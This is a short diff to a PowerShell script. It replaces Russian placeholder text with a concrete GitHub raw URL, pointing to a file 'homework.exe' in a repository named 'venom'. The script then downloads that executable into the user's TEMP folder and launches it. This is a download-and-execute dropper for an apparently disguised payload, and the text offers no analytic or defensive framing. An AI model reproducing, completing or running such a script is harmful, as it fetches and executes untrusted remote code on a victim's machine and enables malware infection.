@@ -1,4 +1,4 @@
-$url = "https://github.com/ваш-репозиторий/ваш-файл.exe"  
-$output = "$env:TEMP\ваш-файл.exe"  
+$url = "https://github.com/sigmanip/venom/raw/refs/heads/main/homework.exe"  
+$output = "$env:TEMP\homework.exe"  
 Invoke-WebRequest -Uri $url -OutFile $output  
 Start-Process $output  
